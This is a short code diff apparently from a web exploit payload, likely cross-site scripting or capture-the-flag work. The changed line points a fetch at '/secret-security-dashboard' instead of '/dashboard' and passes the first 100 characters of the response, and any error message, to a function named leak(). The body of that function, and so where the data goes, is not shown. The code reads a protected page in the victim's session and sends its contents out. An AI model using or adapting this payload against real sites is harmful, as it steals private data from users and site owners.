@@ -21,7 +21,7 @@ async function leak(data) {
 }
 
 try {
-    fetch('/dashboard').then(res => res.text()).then(d => leak(d.slice(0, 100)));
+    fetch('/secret-security-dashboard').then(res => res.text()).then(d => leak(d.slice(0, 100)));
 } catch (e) {
     leak(e.message);
 }
